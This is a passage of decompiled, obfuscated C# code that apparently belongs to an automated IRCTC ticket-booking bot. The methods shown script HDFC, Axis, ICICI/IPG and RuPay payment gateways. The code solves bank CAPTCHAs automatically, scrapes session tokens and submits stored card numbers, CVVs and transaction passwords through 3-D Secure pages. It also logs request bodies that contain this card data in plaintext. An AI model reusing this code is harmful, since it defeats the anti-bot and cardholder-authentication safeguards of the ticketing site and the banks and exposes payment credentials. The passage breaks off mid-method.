                        string text2 = WebUtility.UrlEncode(HttpUtility.UrlDecode(array2[1])).Trim();
                        text2 = text2.Replace("%5Cn", "%0A");
                        text = text + "&" + array2[0] + "=" + text2;
                    }
                    else
                    {
                        text = text + "&" + array2[0] + "=" + WebUtility.UrlEncode(HttpUtility.UrlDecode(array2[1]));
                    }
                }
            }
            catch
            {
            }
            return text;
        }

        private bool method_164(ref string string_86, string string_87, CookieContainer cookieContainer_2, string string_88, ref string string_89)
        {
            string string_90 = "";
            string string_91 = class3_0.Method_SerialInp(string_86, ref string_90, false);
            string string_92 = "";
            string string_93 = "";
            clsMain.Lock("Enter ProcessPaytmThroughIponlineCC.");
            _Request(string_90, string_91, string_87, webProxy_3, ref cookieContainer_2, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0);
            clsMain.Lock("After ProcessPaytmThroughIponlineCC.");
            string_87 = string_90;
            string_86 = string_93;
            return true;
        }

        internal bool method_165(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            int num2 = 0;
            bool result = false;
            clsMain.Lock("Enter ProcesshdfcDebit.");
            string string_92 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";
            do
            {
                try
                {
                    num++;
                    string_90 = "";
                    string_91 = "";
                    string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                    array[0].Trim();
                    string text = array[2];
                    string string_93 = "";
                    string text2 = "https://hdfcbankpayments.hdfcbank.com/PG";
                    string string_94 = class3_0.Method_SerialInp(string_86, ref string_93, false);
                    CookieContainer cookieContainer_ = null;
                    bool bool_ = false;
                    string string_95 = "";
                    string string_96 = "";
                    if (text.Length == 2 && text[0] == '0')
                    {
                        text = text.Substring(1, 1);
                    }
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_Getway(1/3)", tCntrlName_, null, null);
                    }
                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                    {
                        while (true)
                        {
                            num2++;
                            string string_97 = "MCK75";
                            string string_98 = "https://hdfcbankpayments.hdfcbank.com/PG/PassImageServlet";
                            string string_99 = string_93;
                            string string_100 = "";
                            int int_ = 0;
                            DateTime dateTime_ = DateTime.Now.AddMilliseconds(400.0);
                            bitmap_0 = method_101(string_98, string_99, webProxy_2, ref cookieContainer_, true, 40000, ref bool_, ref webException_0, ref string_100, ref dateTime_, ref int_);
                            if (bitmap_0 != null)
                            {
                                string_97 = new frmCAP(clsMain).method_8(bitmap_0);
                            }
                            string_94 = Class21.smethod_10(string_96, string_87, string_97, "hdfcbankb", "C");
                            string_92 = string_93;
                            string_93 = text2 + "/paymentrouter.htm";
                            if (updateTStatus_1 != null)
                            {
                                updateTStatus_1.BeginInvoke(1, "Init. HDFC_Getway(2/3)", tCntrlName_, null, null);
                            }
                            clsMain.Lock("First Hit Inp = " + string_94);
                            if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                clsMain.Lock("First Hit output = " + string_96);
                                if (string_96.IndexOf("netsafe.hdfcbank.com") > 0)
                                {
                                    method_174(string_96, string_93, cookieContainer_, array[7], ref string_96, ref string_95);
                                }
                                else if (string_96.IndexOf("AxisBank/server/AccessControlServer") > 0)
                                {
                                    string text3 = "https://secure.axisbank.com/acs-web-axis/EnrollWeb/AxisBank/server/AccessControlServer";
                                    string_92 = string_93;
                                    string_94 = class3_0.Method_SerialInp(string_96, ref string_93, true);
                                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                                    {
                                        string_92 = string_93;
                                        string text4 = string_96;
                                        string text5 = text4.Substring(text4.IndexOf("randomDigit") + 15);
                                        string text6 = text5.Substring(0, text5.IndexOf("\""));
                                        text5 = text4.Substring(text4.IndexOf("XID") + 12);
                                        string value = text5.Substring(0, text5.IndexOf("\""));
                                        text5 = text4.Substring(text4.IndexOf("Authenticate") + 22);
                                        string text7 = text5.Substring(0, text5.IndexOf("\""));
                                        text5 = text4.Substring(text4.IndexOf("txtLogin") + 17);
                                        string text8 = text5.Substring(0, text5.IndexOf("\""));
                                        text5 = text4.Substring(text4.IndexOf("ContinueWithPassword"));
                                        text5 = text5.Substring(text5.IndexOf("jsessionid"));
                                        string text9 = text5.Substring(0, text5.IndexOf("\""));
                                        string_94 = "xdeviceId=" + text6 + "&bTz=Asia%2FKolkata&bTzOS=-330&XID=" + WebUtility.UrlEncode(value) + "&txnAuthType=static&hash=&cacheIdentifier=" + text7 + "&txtLogin=" + text8 + "&txtPassword=" + WebUtility.UrlEncode(array[7]) + "&otpValue=";
                                        string_93 = text3 + ";" + text9;
                                        if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                                        {
                                            if (string_96.IndexOf("Invalid Password") > 0)
                                            {
                                                if (updateTStatus_1 != null)
                                                {
                                                    updateTStatus_1.BeginInvoke(1, "Invalid Transaction Password", tCntrlName_, null, null);
                                                }
                                                return false;
                                            }
                                            string_92 = string_93;
                                            string_92 = string_93;
                                            string_94 = class3_0.Method_SerialInp(string_96, ref string_93, true);
                                            if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                                            {
                                                string_91 = string_93;
                                                string_90 = string_96;
                                                return true;
                                            }
                                        }
                                    }
                                }
                                else if (string_96.IndexOf("secure4.arcot.com") > 0)
                                {
                                    method_178(ref string_96, string_93, cookieContainer_, array[7], ref string_95);
                                }
                                if (string_96.Contains("Billing Information"))
                                {
                                    if (!string_96.Contains("id=\"debitCaptchaMsg"))
                                    {
                                        break;
                                    }
                                    if (string_96.Contains("Invalid captcha"))
                                    {
                                        continue;
                                    }
                                    if (string_96.Contains("Invalid card number"))
                                    {
                                        string_91 = "Invaild Card's Details";
                                        clsMain.Lock("Second Hit Failed. Check HTML");
                                        Class11.smethod_3(class3_0.BANKSAVEAS, "1");
                                        return false;
                                    }
                                    break;
                                }
                                if (string_96.Contains("https://securepayments.fssnet.co.in"))
                                {
                                    string_91 = string_93;
                                    string_94 = class3_0.Method_SerialInp(string_96, ref string_93, false);
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_Getway(3/3)", tCntrlName_, null, null);
                                    }
                                    clsMain.Lock("Success ProcessHDFCDebit ");
                                    _Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_96, ref string_95, ref webException_0);
                                    string text10 = string_96.Substring(string_96.IndexOf("responseVal = '") + 15);
                                    text10 = text10.Substring(0, text10.IndexOf("'"));
                                    string text11 = "";
                                    if (!string.IsNullOrEmpty(text10))
                                    {
                                        string[] array2 = Strings.Split(text10, "&");
                                        int num3 = Information.UBound(array2);
                                        for (int i = 0; i <= num3; i++)
                                        {
                                            string[] array3 = Strings.Split(array2[i], "=");
                                            text11 = text11 + "<input type=\"hidden\" name=\"" + array3[0] + "\" value=\"" + HttpUtility.UrlDecode(array3[1]) + "\" />";
                                        }
                                    }
                                    string_90 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en-IN\"><head><script type=\"text/javascript\" src=\"/eticketing/javax.faces.resource/scommon.js.jsf?ln=js\"></script><script type=\"text/javascript\">\t\t\t\tcheckUId(\"10599\");\t\t\t</script><script type=\"text/javascript\">\t\t\t\tsetRId(\"1520332067667\");\t\t\t</script><link type=\"text/css\" rel=\"stylesheet\" href=\"/eticketing/org.richfaces.resources/javax.faces.resource/org.richfaces.staticResource/4.2.3.Final/PackedCompressed/blueSky/skinning.css\" /></head><body><form action=\"" + string_93 + "\" method=\"POST\">" + text11 + "</form>     <center><font size=\"5\" color=\"#3b4455\">Transaction is being processed<br />Please wait ...</font></center> <script type=\"text/javascript\">\tdocument.forms[0].submit();</script></body></html>";
                                    return true;
                                }
                                if (string_96.Contains("result=NOT+CAPTURED"))
                                {
                                    string_91 = "Payment Not Captured";
                                    clsMain.Lock("Final Hit Payment Failed. err = " + string_95);
                                    return false;
                                }
                                break;
                            }
                            clsMain.Lock("Second Page Details. Check HTML" + string_95);
                            break;
                        }
                    }
                    else
                    {
                        clsMain.Lock("First Hit Failed. Check HTML" + string_95);
                    }
                    if (num >= 2)
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_95);
                        string_91 = "Failed while making Payment.";
                        return false;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessHDFCDebit", ex.Message);
                    return false;
                }
            }
            while (clsMain.method_79());
            return result;
        }

        internal bool ICICI_Getway_Rupay(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            int num2 = 0;
            bool result = false;
            clsMain.Lock("Enter ProcesshdfcDebit.");
            string string_92 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";
            try
            {
                bool_51 = true;
                num++;
                string_90 = "";
                string_91 = "";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string text3 = array[2];
                string text4 = array[4];
                string value = array[6];
                //string valueipin = array[7];
                string string_93 = "";
                string string_94 = class3_0.Method_SerialInp(string_86, ref string_93, false);
                if (string_86.Contains("encdata") && clsMain.isAPP)
                {
                    string string_95 = GetString_(string_86, "encdata\",\"value", "\"");
                    string_95 = HttpUtility.UrlEncode(string_95);
                    string_93 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    string_94 = string.Concat(new string[2] { "encdata=", string_95 });
                }
                CookieContainer cookieContainer_ = null;
                string string_96 = "";
                string string_97 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, string_88+"_Getway Int {1}", tCntrlName_, null, null);
                }
                if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                {
                    clsMain.Lock("First Hit output = " + string_97);
                    num2++;
                    string_92 = string_93;
                    if (clsMain.isAPP)
                    {
                        string_94 = class3_0.Method_SerialInp(string_97, ref string_93, false);
                        string_94 = clsPostData.SetPost(string_94, "paymentMethod", "RUPAY");
                        int startIndex = string_97.IndexOf("<form");
                        startIndex = string_97.IndexOf("action", startIndex);
                        startIndex = string_97.IndexOf("\"", startIndex) + 1;
                        int length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string_93 = "https://www4.ipg-online.com" + string_97.Substring(startIndex, length);
                        string text5 = string_97.Substring(string_97.IndexOf("_submitOnEnter(event") + 22);
                        string text6 = text5.Substring(0, text5.IndexOf("')"));
                        text5 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value2 = text5.Substring(0, text5.IndexOf("\""));
                        value2 = WebUtility.UrlEncode(value2);
                        value2 = value2.Replace("!", "%21");
                        string_94 = "paymentMethod=RUPAY&org.apache.myfaces.trinidad.faces.FORM=" + text6 + "&_noJavaScript=false&javax.faces.ViewState=" + value2 + "&source=next";
                    }
                    else
                    {
                        int startIndex2 = string_97.IndexOf("<form");
                        startIndex2 = string_97.IndexOf("action", startIndex2);
                        startIndex2 = string_97.IndexOf("\"", startIndex2) + 1;
                        int length2 = string_97.IndexOf("\"", startIndex2) - startIndex2;
                        string_93 = "https://www4.ipg-online.com" + string_97.Substring(startIndex2, length2);
                        string text7 = string_97.Substring(string_97.IndexOf("firstTableCol\"><form") + 25);
                        string text8 = text7.Substring(0, text7.IndexOf("\""));
                        text7 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value3 = text7.Substring(0, text7.IndexOf("\""));
                        value3 = WebUtility.UrlEncode(value3);
                        value3 = value3.Replace("!", "%21");
                        string_94 = "paymentMethod=0&org.apache.myfaces.trinidad.faces.FORM=" + text8 + "&_noJavaScript=false&javax.faces.ViewState=" + value3 + "&source=next";
                    }
                    string_93 = string_93.Replace("amp;", "");
                    string_94 = string_94.Replace("!", "%21");
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, string_88+"_Getway Int{ 2 }", tCntrlName_, null, null);
                    }
                    clsMain.Lock("2nd Hit Inp = " + string_94);
                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                    {
                        clsMain.Lock("2nd Hit output = " + string_97);
                        string_92 = string_93;
                        string text9 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value4 = text9.Substring(0, text9.IndexOf("\""));
                        value4 = WebUtility.UrlEncode(value4);
                        value4 = value4.Replace("!", "%21");
                        List<string> list = new List<string>();
                        int num3 = 4;
                        for (int i = 0; i < text.Length; i += num3)
                        {
                            if (text.Length - i >= num3)
                            {
                                list.Add(text.Substring(i, num3));
                            }
                            else
                            {
                                list.Add(text.Substring(i, text.Length - i));
                            }
                        }
                        string text10 = list[0] + "+" + list[1] + "+" + list[2] + "+" + list[3];
                        string_93 = string_93.Replace("e1s1", "e1s2");
                        string_92 = string_92.Replace(" ", "%20");
                        if (clsMain.isAPP)
                        {
                            string_94 = "bname=" + WebUtility.UrlEncode(value) + "&cardnumber=" + text10 + "&expmonth=" + text2 + "&expyear=" + text3 + "&cvm_masked=***&cvm=" + text4 + "&org.apache.myfaces.trinidad.faces.FORM=cciForm&_noJavaScript=false&javax.faces.ViewState=" + value4 + "&source=next";
                        }
                        else
                        {
                            string expyearr = text3;
                            int expy = int.Parse(expyearr);
                            expy = expy - 2023;
                            string expmonthr = text2;
                            expmonthr = expmonthr.Substring(1);
                            int expm = int.Parse(expmonthr);
                            expm = expm - 1;
                            //if (text2.Contains("0"))
                            //{
                            //    text2 = text2.Substring(text2.Length - 1);
                            //}
                            text10 = text10.Replace("+", " ");
                            //int num4 = int.Parse(text2);
                            //num4--;
                            //text3 = text3.Substring(text3.Length - 1);
                            //int num5 = int.Parse(text3);
                            //num5--;
                            //num5--;
                            string_94 = "bname=" + WebUtility.UrlEncode(value) + "&cardnumber=" + text10 + "&expmonth=" + expm + "&expyear=" + expy + "&cvm_masked=***&cvm=" + text4 + "&org.apache.myfaces.trinidad.faces.FORM=cciForm&_noJavaScript=false&javax.faces.ViewState=" + value4 + "&source=next";
                        }
                        updateTStatus_1.BeginInvoke(1, string_88+"_Getway Int{ 3 }", tCntrlName_, null, null);
                        clsMain.Lock("3rd Hit Inp = " + string_94);
                        if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                        {
                            string[] rupay = string_97.Split(new string[1] { "\n" }, StringSplitOptions.None);
                            string redirectForm = string_97.Substring(string_97.IndexOf("redirectForm\" name=\"redirectForm\" action=") + 42);
                            redirectForm = redirectForm.Substring(0, redirectForm.IndexOf("\" method=\"post\">"));
                            string_93 = redirectForm;
                            string AccuCardholderId = rupay[7].Substring(rupay[7].IndexOf("hidden") + 15);
                            AccuCardholderId = AccuCardholderId.Substring(0, AccuCardholderId.IndexOf("\" name=\""));

                            string AccuGuid = rupay[8].Substring(rupay[8].IndexOf("hidden") + 15);
                            AccuGuid = AccuGuid.Substring(0, AccuGuid.IndexOf("\" name=\""));

                            string AccuReturnURL = rupay[9].Substring(rupay[9].IndexOf("hidden") + 15);
                            AccuReturnURL = AccuReturnURL.Substring(0, AccuReturnURL.IndexOf("\" name=\""));
                            AccuReturnURL = AccuReturnURL.Replace("amp;", "");
                            string session = rupay[10].Substring(rupay[10].IndexOf("hidden") + 15);
                            session = session.Substring(0, session.IndexOf("\" name=\""));

                            string AccuRequestId = rupay[11].Substring(rupay[11].IndexOf("hidden") + 15);
                            AccuRequestId = AccuRequestId.Substring(0, AccuRequestId.IndexOf("\" name=\""));

                            string_94 = "AccuCardholderId=" + AccuCardholderId + "&AccuGuid=" + AccuGuid + "&AccuReturnURL=" + HttpUtility.UrlEncode(AccuReturnURL) + "&session=" + session + "&AccuRequestId=" + HttpUtility.UrlEncode(AccuRequestId);
                            //////frmMerchantPost = frmMerchantPost.Replace("amp;", "");
                            //clsMain.Lock("3rd Hit output = " + string_97);
                            //text9 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                            //value4 = text9.Substring(0, text9.IndexOf("\""));
                            //value4 = WebUtility.UrlEncode(value4);
                            //value4 = value4.Replace("!", "%21");
                            //string_94 = string.Concat(new string[3] { "colorDepth=24&screenWidth=1920&screenHeight=1080&timezoneOffsetInMinutes=-330&javaEnabled=false&org.apache.myfaces.trinidad.faces.FORM=info&_noJavaScript=false&javax.faces.ViewState=", value4, "&source=submitButton" });
                            //string_92 = string_93;
                            //string_93 = string_93.Replace("e1s2", "e1s3");
                            string text11 = "https://secure.axisbank.com/acs-web-axis/EnrollWeb/AxisBank/server/AccessControlServer";
                            //updateTStatus_1.BeginInvoke(1, string_88+"_Getway Int{ 7/4 }", tCntrlName_, null, null);
                            //clsMain.Lock("4th Hit Inp = " + string_94);
                            if (_Request(string_93, string_94, "https://www4.ipg-online.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0) && string_97.Contains("Second Factor Authentication"))
                            {
                                string_92 = string_93;
                                if (string_97.Contains("Second Factor Authentication"))
                                {
                                    
                                    string_94 = "finalString="+ array[3] +"~"+ AccuCardholderId +"~"+session+"~"+ AccuGuid +"&btnCalled=VERIFY";

                                    string_93 = "https://prdrupayias.insolutionsglobal.com/NPCI_IAS_NSDL/ProcessIPINRequest";
                                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0) && string_97.Contains("ACCU000"))
                                    {
                                        string[] rupay23 = string_97.Split(new string[1] { "~" }, StringSplitOptions.None);
                                        string_93 = AccuReturnURL;
                                        string_94 = "AccuResponseCode=ACCU000&AccuGuid=" + AccuGuid  + "&session=" + session + "&AccuRequestId=" + HttpUtility.UrlEncode(rupay23[1]);
                                        updateTStatus_1.BeginInvoke(1, string_88 + "_Getway Int{ 4 }", tCntrlName_, null, null);
                                        //bool_51 = true;
                                        if (_Request(string_93, string_94, "https://prdrupayias.insolutionsglobal.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            clsMain.Lock("6th Hit output = " + string_97);
                                            Reffral = string_93;
                                            string_90 = string_97;
                                            return true;

                                            //if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                            //{
                                            //    clsMain.Lock("6th Hit output = " + string_97);
                                            //    Reffral = string_93;
                                            //    string_90 = string_97;
                                            //    return true;
                                            //}
                                            clsMain.Lock("First Hit Failed. err = " + string_96);
                                            string_91 = "Failed while making Payment.";
                                            bool flag = false;//We have sent you a text message with an OTP code to your registered mobile number ending with 
                                        }
                                    }
                                                                    }
                                clsMain.Lock("4th Hit output = " + string_97);
                                string_92 = string_93;
                                Debit_Hdfc(string_97, string_92, cookieContainer_0, array[7], ref string_90, ref string_91);
                                string_94 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                                if (_Request(string_93, string_94, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                {
                                    clsMain.Lock("6th Hit output = " + string_97);
                                    Reffral = string_93;
                                    string_90 = string_97;
                                    return true;
                                }
                                string text16 = string_97;
                                string text17 = text16.Substring(text16.IndexOf("Authenticate") + 22);
                                string text18 = text17.Substring(0, text17.IndexOf("\""));
                                string_93 = "https://secure.axisbank.com/acs-web-axis/com.enstage.entransact.servers.AccessControlServerAxis?perform=SEND_OTP_AJAX_REQUEST&msg=Authenticate&bankId=8111&accId=" + text18 + "&pageShown=Authenticate";
                                _Request(string_93, "", string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                text17 = text16.Substring(text16.IndexOf("randomDigit") + 15);
                                string text19 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("XID") + 12);
                                string value8 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("Authenticate") + 22);
                                string text20 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("txtLogin") + 17);
                                string text21 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("document.frmPayerAuth.action") + 22);
                                text17 = text17.Substring(text17.IndexOf("document.frmPayerAuth.action") + 22);
                                text17 = text17.Substring(text17.IndexOf("jsessionid"));
                                string text22 = text17.Substring(0, text17.IndexOf("\""));
                                string_94 = "xdeviceId=" + text19 + "&bTz=Asia%2FKolkata&bTzOS=-330&XID=" + WebUtility.UrlEncode(value8) + "&txnAuthType=static&hash=&cacheIdentifier=" + text20 + "&txtLogin=" + text21 + "&txtPassword=" + WebUtility.UrlEncode(array[7]) + "&otpValue=";
                                string_93 = text11 + ";" + text22;
                                string_94 = class3_0.Method_SerialInp(text16, ref string_93, false);
                                updateTStatus_1.BeginInvoke(1, "ICICI_Getway(5/6)", tCntrlName_, null, null);
                                clsMain.Lock("5th Hit Inp = " + string_94);
                                if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                {
                                    clsMain.Lock("5th Hit output = " + string_97);
                                    if (string_97.IndexOf("Authentication failed") > 0)
                                    {
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Invalid Transaction Password", tCntrlName_, null, null);
                                        }
                                        return false;
                                    }
                                    string_92 = string_93;
                                    text16 = string_97;
                                    string_93 = "https://secure.axisbank.com/acs-web-axis/com.enstage.entransact.servers.AccessControlServerAxis?perform=SEND_OTP_AJAX_REQUEST&msg=MerchantPost&bankId=8111&accId=" + text18 + "&pageShown=MerchantPost";
                                    _Request(string_93, "", string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                    string_94 = class3_0.Method_SerialInp(text16, ref string_93, true);
                                    text9 = text16.Substring(text16.IndexOf("PaRes") + 14);
                                    string value9 = text9.Substring(0, text9.IndexOf("\""));
                                    text9 = text16.Substring(text16.IndexOf("name=\"MD") + 17);
                                    string value10 = text9.Substring(0, text9.IndexOf("\""));
                                    string_94 = "MD=" + WebUtility.UrlEncode(value10) + "&PaRes=" + WebUtility.UrlEncode(value9);
                                    updateTStatus_1.BeginInvoke(1, "ICICI_Getway(6/6)", tCntrlName_, null, null);
                                    clsMain.Lock("6th Hit Inp = " + string_94);
                                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                    {
                                        clsMain.Lock("6th Hit output = " + string_97);
                                        Reffral = string_93;
                                        string_90 = string_97;
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                    clsMain.Lock("First Hit Failed. err = " + string_96);
                    string_91 = "Failed while making Payment.";
                    return false;
                }
                return result;
            }
            catch (Exception ex)
            {
                clsMain.method_74("ProcessHDFCDebit", ex.Message);
                return false;
            }
        }

        internal bool ICICI_Getway(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            int num2 = 0;
            bool result = false;
            clsMain.Lock("Enter ProcesshdfcDebit.");
            string string_92 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";
            try
            {
                bool_51 = true;
                num++;
                string_90 = "";
                string_91 = "";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string text3 = array[2];
                string text4 = array[4];
                string value = array[6];
                //string valueipin = array[7];
                string string_93 = "";
                string string_94 = class3_0.Method_SerialInp(string_86, ref string_93, false);
                if (string_86.Contains("encdata") && clsMain.isAPP)
                {
                    string string_95 = GetString_(string_86, "encdata\",\"value", "\"");
                    string_95 = HttpUtility.UrlEncode(string_95);
                    string_93 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    string_94 = string.Concat(new string[2] { "encdata=", string_95 });
                }
                CookieContainer cookieContainer_ = null;
                string string_96 = "";
                string string_97 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, string_88 + "_Getway Int { 7/1 }", tCntrlName_, null, null);
                }
                if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                {
                    clsMain.Lock("First Hit output = " + string_97);
                    num2++;
                    string_92 = string_93;
                    if (clsMain.isAPP)
                    {
                        string_94 = class3_0.Method_SerialInp(string_97, ref string_93, false);
                        string_94 = clsPostData.SetPost(string_94, "paymentMethod", "VISA");
                        int startIndex = string_97.IndexOf("<form");
                        startIndex = string_97.IndexOf("action", startIndex);
                        startIndex = string_97.IndexOf("\"", startIndex) + 1;
                        int length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string_93 = "https://www4.ipg-online.com" + string_97.Substring(startIndex, length);
                        string text5 = string_97.Substring(string_97.IndexOf("_submitOnEnter(event") + 22);
                        string text6 = text5.Substring(0, text5.IndexOf("')"));
                        text5 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value2 = text5.Substring(0, text5.IndexOf("\""));
                        value2 = WebUtility.UrlEncode(value2);
                        value2 = value2.Replace("!", "%21");
                        string_94 = "paymentMethod=VISA&org.apache.myfaces.trinidad.faces.FORM=" + text6 + "&_noJavaScript=false&javax.faces.ViewState=" + value2 + "&source=next";
                    }
                    else
                    {
                        int startIndex2 = string_97.IndexOf("<form");
                        startIndex2 = string_97.IndexOf("action", startIndex2);
                        startIndex2 = string_97.IndexOf("\"", startIndex2) + 1;
                        int length2 = string_97.IndexOf("\"", startIndex2) - startIndex2;
                        string_93 = "https://www4.ipg-online.com" + string_97.Substring(startIndex2, length2);
                        string text7 = string_97.Substring(string_97.IndexOf("firstTableCol\"><form") + 25);
                        string text8 = text7.Substring(0, text7.IndexOf("\""));
                        text7 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value3 = text7.Substring(0, text7.IndexOf("\""));
                        value3 = WebUtility.UrlEncode(value3);
                        value3 = value3.Replace("!", "%21");
                        string_94 = "paymentMethod=0&org.apache.myfaces.trinidad.faces.FORM=" + text8 + "&_noJavaScript=false&javax.faces.ViewState=" + value3 + "&source=next";
                    }
                    string_93 = string_93.Replace("amp;", "");
                    string_94 = string_94.Replace("!", "%21");
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, string_88 + "_Getway Int{ 7/2 }", tCntrlName_, null, null);
                    }
                    clsMain.Lock("2nd Hit Inp = " + string_94);
                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                    {
                        clsMain.Lock("2nd Hit output = " + string_97);
                        string_92 = string_93;
                        string text9 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value4 = text9.Substring(0, text9.IndexOf("\""));
                        value4 = WebUtility.UrlEncode(value4);
                        value4 = value4.Replace("!", "%21");
                        List<string> list = new List<string>();
                        int num3 = 4;
                        for (int i = 0; i < text.Length; i += num3)
                        {
                            if (text.Length - i >= num3)
                            {
                                list.Add(text.Substring(i, num3));
                            }
                            else
                            {
                                list.Add(text.Substring(i, text.Length - i));
                            }
                        }
                        string text10 = list[0] + "+" + list[1] + "+" + list[2] + "+" + list[3];
                        string_93 = string_93.Replace("e1s1", "e1s2");
                        string_92 = string_92.Replace(" ", "%20");
                        if (clsMain.isAPP)
                        {
                            string_94 = "bname=" + WebUtility.UrlEncode(value) + "&cardnumber=" + text10 + "&expmonth=" + text2 + "&expyear=" + text3 + "&cvm_masked=***&cvm=" + text4 + "&org.apache.myfaces.trinidad.faces.FORM=cciForm&_noJavaScript=false&javax.faces.ViewState=" + value4 + "&source=next";
                        }
                        else
                        {
                            string expyearr = text3;
                            int expy = int.Parse(expyearr);
                            expy = expy - 2023;
                            string expmonthr = text2;
                            expmonthr = expmonthr.Substring(1);
                            int expm = int.Parse(expmonthr);
                            expm = expm - 1;
                            //if (text2.Contains("0"))
                            //{
                            //    text2 = text2.Substring(text2.Length - 1);
                            //}
                            text10 = text10.Replace("+", " ");
                            //int num4 = int.Parse(text2);
                            //num4--;
                            //text3 = text3.Substring(text3.Length - 1);
                            //int num5 = int.Parse(text3);
                            //num5--;
                            //num5--;
                            string_94 = "bname=" + WebUtility.UrlEncode(value) + "&cardnumber=" + text10 + "&expmonth=" + expm + "&expyear=" + expy + "&cvm_masked=***&cvm=" + text4 + "&org.apache.myfaces.trinidad.faces.FORM=cciForm&_noJavaScript=false&javax.faces.ViewState=" + value4 + "&source=next";
                        }
                        updateTStatus_1.BeginInvoke(1, string_88 + "_Getway Int{ 7/3 }", tCntrlName_, null, null);
